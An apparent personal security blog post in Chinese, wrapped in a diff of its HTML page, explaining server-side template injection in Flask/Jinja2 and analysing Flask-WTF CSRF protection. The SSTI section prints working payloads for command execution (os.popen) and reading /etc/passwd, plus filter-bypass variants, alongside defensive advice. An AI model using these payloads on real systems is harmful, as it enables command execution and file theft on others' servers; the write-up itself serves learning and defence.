@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。10号前一直在搞用flask写的bms，算是荒废掉了。。先说一句废话，七牛CDN有个测试域名，一段时间后失效，失效后需要替换为自己备案后的域名进行CDN加速，在这里出现了一个问题，在hexo主题配置文件将URL换为自己的CDN域名后，用之前的域名上传的图片就找不到了（因为之前的域名已经被废弃，无法解析）这时候可以 hex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask&amp;ssti&amp;csrf">
+<meta property="og:url" content="https://polosec.github.io/2020/05/14/flask-ssti-csrf/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。10号前一直在搞用flask写的bms，算是荒废掉了。。先说一句废话，七牛CDN有个测试域名，一段时间后失效，失效后需要替换为自己备案后的域名进行CDN加速，在这里出现了一个问题，在hexo主题配置文件将URL换为自己的CDN域名后，用之前的域名上传的图片就找不到了（因为之前的域名已经被废弃，无法解析）这时候可以 hex">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/csrf1.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/csrf2.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/csrf3.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/csrf4.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/csrf5.jpg">
+<meta property="article:published_time" content="2020-05-14T04:42:38.000Z">
+<meta property="article:modified_time" content="2020-05-14T14:00:00.222Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/static/images/csrf1.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>flask&amp;ssti&amp;csrf</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/05/14/DASCTF-misc/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/05/01/SSL-TLS/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/05/14/flask-ssti-csrf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&text=flask&amp;ssti&amp;csrf"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&is_video=false&description=flask&amp;ssti&amp;csrf"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=flask&amp;ssti&amp;csrf&body=Check out this article: https://polosec.github.io/2020/05/14/flask-ssti-csrf/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&name=flask&amp;ssti&amp;csrf&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&t=flask&amp;ssti&amp;csrf"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E8%BF%91%E2%80%9D%E9%97%B2%E7%9A%84%E2%80%9D%E6%B2%A1%E4%BA%8B%E7%A0%94%E7%A9%B6%E4%BA%86%E4%B8%80%E4%B8%8Bflask%E6%A1%86%E6%9E%B6%E7%9A%84%E9%98%B2%E6%8A%A4%E9%97%AE%E9%A2%98%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AFssti%E4%B8%8Ecsrf%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.1.</span> <span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.2.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">SSTI利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">过滤与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8F%8C%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">过滤双下划线</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">过滤中括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%82%B9%E5%8F%B7"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">过滤点号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">关键词过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E9%98%B2%E5%BE%A1"><span class="toc-number">1.2.3.</span> <span class="toc-text">SSTI防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask-csrf%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">flask csrf分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%8F%A3%E5%B0%B1%E6%98%AF%E8%80%81csrf%E4%BA%86%EF%BC%8C%E5%85%88%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">开口就是老csrf了，先分析分析源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E5%91%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">生命流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E6%8A%A4"><span class="toc-number">1.3.3.</span> <span class="toc-text">CSRF防护</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        flask&amp;ssti&amp;csrf
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-14T04:42:38.000Z" itemprop="datePublished">2020-05-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。"><a href="#最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。" class="headerlink" title="最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。"></a>最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。</h1><p>10号前一直在搞用flask写的bms，算是荒废掉了。。<br>先说一句废话，七牛CDN有个测试域名，一段时间后失效，失效后需要替换为自己备案后的域名进行CDN加速，在这里出现了一个问题，在hexo主题配置文件将URL换为自己的CDN域名后，用之前的域名上传的图片就找不到了（因为之前的域名已经被废弃，无法解析）<br>这时候可以 hexo clean 然后 hexo g，重新把md文件渲染成html文件，这样里面产生的图片链接的URL前缀就是我们新配置的CDN域名。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw">https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw</a><br><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0">https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a><br><a target="_blank" rel="noopener" href="http://shaobaobaoer.cn/archives/660/python-flask-jinja-ssti">http://shaobaobaoer.cn/archives/660/python-flask-jinja-ssti</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></p>
+<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>ssti就是服务器端模板注入（Server Side Template Injection）<br>模板指的是现成写好的东西，只需要传入一些变量到模板，然后渲染成html页面。模板是写好的，而变量是每次需要传入的。<br>不正确地使用模板引擎进行渲染时，会出现SSTI漏洞。（jinja2）<br>在flask中，使用jinja2模板渲染引擎，有两种渲染模板的方法：render_template()和render_template_string()，两种方法的区别是第一种指定一个模板文件(.html)，第二种则规定了需要传入一个字符串，把html代码写到字符串中。<br>出现问题的是第二种渲染方式（我写bms的时候用的是第一种。。本来想写写防御来着，但是根本不存在利用点），当显示方式为直接获取变量时，如</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person[<span class="string">&#x27;name&#x27;</span>]=request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">hello ,&#123;&#123;person.name&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这样的话传入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>的话显示的就是7*7，因为这样会把传入的内容当作字符串进行处理，而非模板语句。<br>如果是这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person[&#39;name&#39;]&#x3D;request.args.get(&#39;name&#39;)</span><br><span class="line">hello ,%s %person[&#39;name&#39;]</span><br></pre></td></tr></table></figure>
+<p>通过字符串格式化的方式传入内容，模板语句会被解释执行。</p>
+<h3 id="SSTI利用"><a href="#SSTI利用" class="headerlink" title="SSTI利用"></a>SSTI利用</h3><p>任何漏洞的目的是实现个人意图，比如getshell，读取文件。<br>对于SSTI的利用，我遇到的主要是通过获得config里面的secret key进行伪造session，模拟管理员登录；或者通过实例化os反弹shell，或者通过file、open对象进行文件读取。<br>__class__获取当前实例的对象，__mro__获得父类链，__subclasses__获得当前类所有的子类，__init__实例化一个类，__globals__获取所有可用的方法与变量。<br>举例：<br>命令执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="过滤与绕过"><a href="#过滤与绕过" class="headerlink" title="过滤与绕过"></a>过滤与绕过</h3><h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><p>request.args是Flask中的一个属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来，进而绕过了引号的过滤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;tmp&#x2F;cmd.py</span><br></pre></td></tr></table></figure>
+<h4 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure>
+<h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h4><p>首先明白中括号是什么作用：从字典中取值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">globals[&quot;os&quot;]&#x3D;&#x3D;globals.os 所以可以用__getitem__绕过。</span><br></pre></td></tr></table></figure>
+<h4 id="过滤点号"><a href="#过滤点号" class="headerlink" title="过滤点号"></a>过滤点号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__等价于&quot;&quot;[&quot;__class__&quot;]</span><br></pre></td></tr></table></figure>
+<h4 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h4><p>思路是进行拼接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="SSTI防御"><a href="#SSTI防御" class="headerlink" title="SSTI防御"></a>SSTI防御</h3><p>首先是尽量不使用render_template_string(),如果用的话，尽量不使用格式化字符串的形式；如果必须使用的话，要建立相对强的过滤规则，尤其是对小括号的过滤，过滤小括号后就很难执行命令了。<br>对于关键词过滤，我的思路是进行预处理，将接收到的字符串中的引号，加号等特殊符号正则匹配去掉后再进行黑名单匹配。</p>
+<h2 id="flask-csrf分析"><a href="#flask-csrf分析" class="headerlink" title="flask csrf分析"></a>flask csrf分析</h2><h3 id="开口就是老csrf了，先分析分析源码"><a href="#开口就是老csrf了，先分析分析源码" class="headerlink" title="开口就是老csrf了，先分析分析源码"></a>开口就是老csrf了，先分析分析源码</h3><p>首先</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSRFProtect(app)</span><br></pre></td></tr></table></figure>
+<p>，跟进CSRFProtect</p>
+<img src="http://cdn.polowong.top/static/images/csrf1.jpg">
+<p> 然后有一个app.before_request修饰的方法，说明在请求前执行。<br> 该方法进行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.protect()</span><br></pre></td></tr></table></figure>
+<p> 跟进self.protect()<br> 使用方法validate_csrf尝试验证token的正确性，token为self._get_csrf_token</p>
+<img src="http://cdn.polowong.top/static/images/csrf2.jpg">
+<img src="http://cdn.polowong.top/static/images/csrf3.jpg">
+<img src="http://cdn.polowong.top/static/images/csrf4.jpg">
+<img src="http://cdn.polowong.top/static/images/csrf5.jpg">
+<p>其实对URLSafeTimedSerializer这个我不是太熟悉，我对他的理解是产生一个session，session包括三个字段，base64加密的数据字段，timestamp，签名。<br>然后产生的token就是获取序列化后的session的数据字段的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[field_name]</span><br></pre></td></tr></table></figure>
+<p>中的数据。</p>
+<h3 id="生命流程"><a href="#生命流程" class="headerlink" title="生命流程"></a>生命流程</h3><p>第一次访问，产生session与token，设置过期时间<br>第二次包括以后的访问在头部或者表单中携带token，访问前进行验证，验证通过则允许访问。除了token外还有请求头，同源策略等验证</p>
+<h3 id="CSRF防护"><a href="#CSRF防护" class="headerlink" title="CSRF防护"></a>CSRF防护</h3><p>就flask的csrf防护方法而言，主要是防止hacker拿到token，主要需要防范xss，比如上述提到的ssti会导致xss。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E8%BF%91%E2%80%9D%E9%97%B2%E7%9A%84%E2%80%9D%E6%B2%A1%E4%BA%8B%E7%A0%94%E7%A9%B6%E4%BA%86%E4%B8%80%E4%B8%8Bflask%E6%A1%86%E6%9E%B6%E7%9A%84%E9%98%B2%E6%8A%A4%E9%97%AE%E9%A2%98%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AFssti%E4%B8%8Ecsrf%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.1.</span> <span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.2.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">SSTI利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">过滤与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8F%8C%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">过滤双下划线</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">过滤中括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%82%B9%E5%8F%B7"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">过滤点号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">关键词过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E9%98%B2%E5%BE%A1"><span class="toc-number">1.2.3.</span> <span class="toc-text">SSTI防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask-csrf%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">flask csrf分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%8F%A3%E5%B0%B1%E6%98%AF%E8%80%81csrf%E4%BA%86%EF%BC%8C%E5%85%88%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">开口就是老csrf了，先分析分析源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E5%91%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">生命流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E6%8A%A4"><span class="toc-number">1.3.3.</span> <span class="toc-text">CSRF防护</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/05/14/flask-ssti-csrf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&text=flask&amp;ssti&amp;csrf"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&is_video=false&description=flask&amp;ssti&amp;csrf"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=flask&amp;ssti&amp;csrf&body=Check out this article: https://polosec.github.io/2020/05/14/flask-ssti-csrf/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&title=flask&amp;ssti&amp;csrf"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&name=flask&amp;ssti&amp;csrf&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/05/14/flask-ssti-csrf/&t=flask&amp;ssti&amp;csrf"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
